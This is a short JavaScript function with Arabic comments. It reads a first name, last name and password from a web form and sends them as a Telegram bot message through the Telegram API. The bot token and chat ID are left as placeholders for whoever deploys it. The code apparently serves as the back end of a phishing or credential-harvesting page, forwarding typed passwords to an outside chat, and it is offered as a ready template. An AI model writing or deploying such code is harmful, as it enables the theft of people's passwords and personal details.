function sendToTelegram() {
    let firstName = document.getElementById("firstName").value;
    let lastName = document.getElementById("lastName").value;
    let password = document.getElementById("password").value;

    let botToken = "🔴 ضع_رمز_API_هنا";  // أدخل رمز API من BotFather
    let chatId = "🔴 ضع_Chat_ID_هنا";   // أدخل Chat ID الخاص بك

    let message = `🚀 بيانات جديدة من المستخدم:\n\n👤 الاسم: ${firstName}\n📝 اللقب: ${lastName}\n🔒 الكود السري: ${password}`;

    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("تم إرسال البيانات بنجاح!");
            } else {
                alert("حدث خطأ أثناء الإرسال.");
            }
        })
        .catch(error => alert("تعذر الاتصال بتلغرام."));
}
